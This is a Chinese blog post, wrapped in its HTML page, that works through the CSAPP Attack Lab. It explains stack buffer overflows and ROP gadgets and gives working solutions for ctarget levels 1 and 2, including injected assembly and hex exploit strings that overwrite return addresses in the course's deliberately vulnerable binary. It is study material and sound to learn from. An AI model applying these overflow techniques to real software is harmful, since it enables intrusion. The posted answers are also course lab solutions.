@@ -1,0 +1,1561 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-center-circle.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="c语言,CSAPP,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;emsp;&amp;emsp;本次实验是CSAPP第三个lab：Attack，在实验2的基础上更进一步，不但需要分析汇编代码，还需要分析栈帧内容，通过栈溢出来注入攻击代码。通过本次实验，我们可以更加清晰的认识到缓冲区溢出的危害，了解如何利用栈帧漏洞更改程序跳转地址，以执行恶意代码，修改程序功能。">
+<meta name="keywords" content="c语言,CSAPP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP-lab3-Attack">
+<meta property="og:url" content="http://sworduo.net/2019/05/22/CSAPP-lab3-Attack/index.html">
+<meta property="og:site_name" content="Sworduo&#39;s Blog">
+<meta property="og:description" content="&amp;emsp;&amp;emsp;本次实验是CSAPP第三个lab：Attack，在实验2的基础上更进一步，不但需要分析汇编代码，还需要分析栈帧内容，通过栈溢出来注入攻击代码。通过本次实验，我们可以更加清晰的认识到缓冲区溢出的危害，了解如何利用栈帧漏洞更改程序跳转地址，以执行恶意代码，修改程序功能。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://sworduo.net/2019/05/22/CSAPP-lab3-Attack/head.jpg">
+<meta property="og:image" content="http://sworduo.net/2019/05/22/CSAPP-lab3-Attack/Attack-gadget.png">
+<meta property="og:image" content="http://sworduo.net/2019/05/22/CSAPP-lab3-Attack/Attack-rl2.png">
+<meta property="og:image" content="http://sworduo.net/2019/05/22/CSAPP-lab3-Attack/Attack-rl3.png">
+<meta property="og:updated_time" content="2019-06-22T11:58:11.598Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSAPP-lab3-Attack">
+<meta name="twitter:description" content="&amp;emsp;&amp;emsp;本次实验是CSAPP第三个lab：Attack，在实验2的基础上更进一步，不但需要分析汇编代码，还需要分析栈帧内容，通过栈溢出来注入攻击代码。通过本次实验，我们可以更加清晰的认识到缓冲区溢出的危害，了解如何利用栈帧漏洞更改程序跳转地址，以执行恶意代码，修改程序功能。">
+<meta name="twitter:image" content="http://sworduo.net/2019/05/22/CSAPP-lab3-Attack/head.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://sworduo.net/2019/05/22/CSAPP-lab3-Attack/">
+
+
+
+
+
+  <title>CSAPP-lab3-Attack | Sworduo's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sworduo's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sworduo.net/2019/05/22/CSAPP-lab3-Attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sworduo">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/horse.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sworduo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CSAPP-lab3-Attack</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-22T20:50:48+08:00">
+                2019-05-22
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-06-22T19:58:11+08:00">
+                2019-06-22
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/c语言/" itemprop="url" rel="index">
+                    <span itemprop="name">c语言</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/05/22/CSAPP-lab3-Attack/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/05/22/CSAPP-lab3-Attack/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/05/22/CSAPP-lab3-Attack/" class="leancloud_visitors" data-flag-title="CSAPP-lab3-Attack">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  19 min
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <img src="/2019/05/22/CSAPP-lab3-Attack/head.jpg">
+<p>&emsp;&emsp;本次实验是CSAPP第三个lab：Attack，在<a href="http://sworduo.net/2019/05/15/CSAPP-lab2/">实验2</a>的基础上更进一步，不但需要分析汇编代码，还需要分析栈帧内容，通过栈溢出来注入攻击代码。通过本次实验，我们可以更加清晰的认识到缓冲区溢出的危害，了解如何利用栈帧漏洞更改程序跳转地址，以执行恶意代码，修改程序功能。<br><a id="more"></a></p>
+<p>&emsp;&emsp;实验要求：阅读《深入理解计算机系统（第三版）》的3.10.3~3.10.4。<br>&emsp;&emsp;参考：<a href="https://www.jianshu.com/p/db731ca57342" target="_blank" rel="noopener">CSAPP:Attack lab</a><br>&emsp;&emsp;说明：<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">WriteUp</a>  </p>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>本次实验一共介绍了两种最基本的利用缓冲区溢出入侵程序的手段：注入代码和ROP。 </p>
+<h2 id="注入代码入侵"><a href="#注入代码入侵" class="headerlink" title="注入代码入侵"></a>注入代码入侵</h2><p>&emsp;&emsp;C语言中，执行函数时会分配栈帧空间并更改栈顶位置，与此同时，所有函数申请的局部变量，都会保存在分配到的栈帧中。而在本函数的栈帧空间之上，就是调用本函数的caller的返回地址。由于C语言中缺少对数组边界的检查，这意味着，如果我在一个函数中申请一个数组，然而我输入的数据大于数组的长度，那么多出来的数据将会覆盖其余的栈帧内容！  </p>
+<p>&emsp;&emsp;一般意义下的缓存溢出漏洞就是发生了上述的情况。程序接收了大于数组长度的数据，而多出来的数据覆盖了栈帧上的其他内容，比如返回地址。这样一来，只要精心计算一下栈中各部分代码的空间分配位置，就能用注入代码地址覆盖函数返回地址，强迫程序完成后跳转到注入代码的位置，执行非法代码！  </p>
+<h2 id="ROP攻击"><a href="#ROP攻击" class="headerlink" title="ROP攻击"></a>ROP攻击</h2><p>&emsp;&emsp;缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦。现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。</p>
+<ul>
+<li>栈随机化：栈随机化的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。上述3个阶段中，栈的地址是固定的，所以我们可以获取到栈的地址，并跳转到栈的指定位置。</li>
+<li>栈破坏检测：最近的GCC版本在产生的代码加入了一种栈保护者机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。</li>
+<li>限制可执行代码区域：最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。  </li>
+</ul>
+<p>&emsp;&emsp;在ROP攻击中，因为栈上限制了不可插入可执行代码，所以不能像上述第二、第三阶段中插入代码。所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以ret结尾，这一段指令序列，我们称之为gadget。如图所示：<br><img src="Attack-gadget.png" alt="Attack-gadget" title="Attack-gadget"></p>
+<p>&emsp;&emsp;每一段gadget包含一系列指令字节，而且以ret结尾，跳转到下一个gadget，就这样连续的执行一系列的指令代码，对程序造成攻击。比如有这么一段代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>汇编后得到：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000400</span>f15 &lt;setval_210&gt;:</span><br><span class="line">  <span class="number">400</span>f15: <span class="built_in">c7</span> <span class="number">07</span> <span class="built_in">d4</span> <span class="number">48</span> <span class="number">89</span> <span class="built_in">c7</span> <span class="keyword">movl </span><span class="number">$0xc78948d4</span>,(%rdi)</span><br><span class="line">  <span class="number">400</span>f1b: <span class="built_in">c3</span> retq</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;仔细观察代码，可以看到字节序列恰好是指令movq %rax, %rdi的编码，因此，如果程序跳转到地址0x400f18处，就能执行寄存器赋值操作。因此，当栈帧代码不可执行时，我们需要想办法在已有的字节码中找到我们所需要的字节码片段，然后将字节码的地址插入的栈帧中，通过ret实现前后代码的跳转。比如我找到了三段gadget代码，地址分别是ABC，那么我把ABC的地址放在相邻的栈帧中。首先函数返回ret跳转到A地址处，跳转之后rsp自动+8，此时rsp指向地址B，当A处指令执行完，调用ret，此时跳转到B指向的代码处，此时rsp继续+8，rsp指向地址C。以此类推，通过ret来控制程序执行。具体字节编码和汇编语句的映射关系可以查看<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">这里</a>（回忆一下，ret指令是获取当前rsp寄存器的值当做地址来跳转，然后rsp+8）  </p>
+<p>&emsp;&emsp;本次实验需要按要求“攻击”5次给定程序，前三次是注入代码攻击，后两次是ROP攻击。  </p>
+<h1 id="Ctarget-level-1"><a href="#Ctarget-level-1" class="headerlink" title="Ctarget-level-1"></a>Ctarget-level-1</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如果输入<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./ctarget</span></span><br></pre></td></tr></table></figure></p>
+<p>不能执行，那么请在后面加上-q参数：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./ctarget</span> -q</span><br></pre></td></tr></table></figure></p>
+<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>假如在可执行文件CTARGET中，有一个负责读取键盘输入，并将数据存入到栈帧空间的函数getbuf：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function">2 </span>&#123;</span><br><span class="line"><span class="number">3</span> <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line"><span class="number">4</span> Gets(buf);</span><br><span class="line"><span class="number">5</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">6</span> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>该函数被test函数调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">2 </span>&#123;</span><br><span class="line"><span class="number">3</span> <span class="keyword">int</span> val;</span><br><span class="line"><span class="number">4</span> val = getbuf();</span><br><span class="line"><span class="number">5</span> <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line"><span class="number">6</span> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>本题要求输入一段字符串，覆盖掉getbuf的返回函数地址，使得getbuf返回到另一个函数touch1去：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">2 </span>&#123;</span><br><span class="line"><span class="number">3</span> vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="number">4</span> <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line"><span class="number">5</span> validate(<span class="number">1</span>);</span><br><span class="line"><span class="number">6</span> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">7</span> &#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>&emsp;&emsp;首先，需要注意的是，程序里的数据、地址按照小端法的方式保存，也就是说对于地址0x4017ef，在栈帧中的保存方式是（地址由小到大）：ef 17 40 00 00 00 00 00。嗯，是64位地址，别搞错了。  </p>
+<p>&emsp;&emsp;我们想要用输入数据覆盖掉getbuf的返回地址，并且让getbuf跳转到touch1函数去，那么我们必须需要知道</p>
+<ol>
+<li>getbuf的输入缓存大小。</li>
+<li>getbuf的栈帧大小，以此确定存放getbuf返回函数地址的栈帧区域。 </li>
+<li>touch1函数的入口地址。  </li>
+</ol>
+<p>那么，首先反汇编得到ctarget的汇编代码：</p>
+<pre><code>objdump -d ctarget &gt; ctargetCode.txt
+</code></pre><p>分析汇编代码，我们可以得知touch1的入口地址是0x4017c0<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004017</span><span class="keyword">c</span><span class="number">0</span> &lt;touch<span class="number">1</span>&gt;:</span><br><span class="line">  <span class="number">4017</span><span class="keyword">c</span><span class="number">0</span>:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          	<span class="keyword">sub</span>    $<span class="number">0x8</span>,<span class="symbol">%rsp</span></span><br></pre></td></tr></table></figure></p>
+<p>接着分析getbuf代码，发现getbuf一共申请了0x28（十进制40）个字节来保存输入数据。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004017a8</span> &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>          	sub    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  4017ac:	<span class="number">48</span> <span class="number">89</span> e7             	mov    %rsp,%rdi</span><br><span class="line">  4017<span class="built_in">af</span>:	e8 8c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  <span class="number">4017b4</span>:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">4017b9</span>:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>          	add    $<span class="number">0x28</span>,%rsp</span><br><span class="line">  4017bd:	c3                   	retq  </span><br><span class="line">一种可行的方法：</span><br></pre></td></tr></table></figure></p>
+<p>再分析调用getbuf的test函数，发现test的返回地址保存在属于getbuf栈帧的上面8个字节处：<br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48<span class="number"> 83 </span>ec<span class="number"> 08 </span>         	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8<span class="number"> 00 </span>00<span class="number"> 00 </span>00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8<span class="number"> 32 </span>fe ff ff       	callq  4017a8 &lt;getbuf&gt;</span><br></pre></td></tr></table></figure></p>
+<p>很显然，假设当前栈顶rsp在getbuf处，那么rsp~rsp+0x27是保存输入数据，rsp+0x28~0x+2f保存getbuf的返回地址。剩下的很简单，我们输入48个字节，并且最后8个字节是touch1的入口地址即可，这里为了简单起见，我的前40个字节都是00：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">C0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure></p>
+<p>将上述字节码保存文件ctarget-l1.txt处，输入命令即可pass第一个任务:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./hex2raw</span> &lt; ctarget-l1.txt | <span class="string">./ctarget</span> -q</span><br></pre></td></tr></table></figure></p>
+<h1 id="Ctarget-level-2"><a href="#Ctarget-level-2" class="headerlink" title="Ctarget-level-2"></a>Ctarget-level-2</h1><h2 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h2><p>和level1类似，覆盖函数返回地址，使得getbuf函数完成后跳转到touch2函数。不同的是，这一次需要带上参数。</p>
+<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><ol>
+<li>参数是保存在%rdi处</li>
+<li>使用ret跳转代码。因为ret是绝对地址跳转，而jmp和callq是相对地址跳转，对于注入代码来说，相对地址不好计算，绝对地址方便很多。</li>
+</ol>
+<h2 id="解决思路-1"><a href="#解决思路-1" class="headerlink" title="解决思路"></a>解决思路</h2><p>&emsp;&emsp;那么首先我们思考一下，在getbuf之后代码应该跳转到哪里？=&gt;跳转到我们的注入代码处。<br>&emsp;&emsp;我们的注入代码在哪里？=&gt;在getbuf申请的rsp栈帧里。<br>&emsp;&emsp;此时rsp~rsp+0x27存放输入数据（注入代码），rsp+0x28~rsp+0x2f存放跳转地址。<br>&emsp;&emsp;现在问题转化为寻找当前rsp的值。<br>&emsp;&emsp;打开gdb，在getbuf这里设置断点。然后通过print $rsp查看栈顶值。<br>&emsp;&emsp;我的rsp是$5561dc78。  </p>
+<p>我们的思路是，将getbuf的返回函数地址修改为注入代码处的地址，也就是存放读入数据的栈顶位置，然后执行参数赋值、修改函数返回值的操作，最后ret带着参数跳转到touch2处。  </p>
+<p>剩下的就好办了，新建inject.s文件，文件内容是：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line"><span class="keyword">push</span> $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p>
+<p>使用先编译后反汇编得到二进制代码。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">gcc</span> <span class="selector-tag">-c</span> <span class="selector-tag">inject</span><span class="selector-class">.s</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Objdump</span> <span class="selector-tag">-d</span> <span class="selector-tag">inject</span><span class="selector-class">.o</span></span><br></pre></td></tr></table></figure>
+<p>反汇编内容如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">inject.o</span>:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure></p>
+<p>得到注入代码的字节码后，将其保存到ctarget-l2.txt，文件内容是:<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">48 </span>c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span> ec <span class="number">17</span></span><br><span class="line"><span class="symbol">40 </span><span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="symbol">78 </span>dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure></p>
+<p>最后输入指令即可pass第二个问题。<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./hex2raw</span> &lt; ctarget-l2.txt | <span class="string">./ctarget</span> -q</span><br></pre></td></tr></table></figure></p>
